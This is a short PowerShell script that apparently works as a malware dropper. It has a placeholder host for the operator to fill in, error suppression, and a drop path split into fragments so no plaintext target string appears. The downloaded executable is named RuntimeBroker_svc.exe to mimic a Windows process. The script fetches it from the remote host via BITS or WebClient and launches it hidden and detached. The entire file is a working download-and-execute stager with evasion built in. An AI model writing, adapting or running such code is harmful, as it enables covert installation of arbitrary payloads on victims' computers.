# ════════════════════════════════════════════════════
#  CONFIG — set before uploading to your host
# ════════════════════════════════════════════════════
$H = 'https://YOUR-HOST.pages.dev'   # <-- REPLACE THIS
# ════════════════════════════════════════════════════

$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = 3072

# build drop path from parts — no single plaintext target string
$a = $env:LOCALAPPDATA
$b = '\Microsoft\Win' + 'dows\Run' + 'timeBro' + 'ker_svc.exe'
$p = $a + $b

# resource path — named as generic data file, no extension
$u = $H + '/sync'

# primary: BITS (Windows Background Intelligent Transfer — same as Windows Update)
# fallback: WebClient
try {
    Import-Module BitsTransfer -ErrorAction Stop
    Start-BitsTransfer -Source $u -Destination $p -ErrorAction Stop
} catch {
    (New-Object System.Net.WebClient).DownloadFile($u, $p)
}

# launch hidden + detached
if (Test-Path $p) {
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName        = $p
    $si.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $si.CreateNoWindow  = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null
}
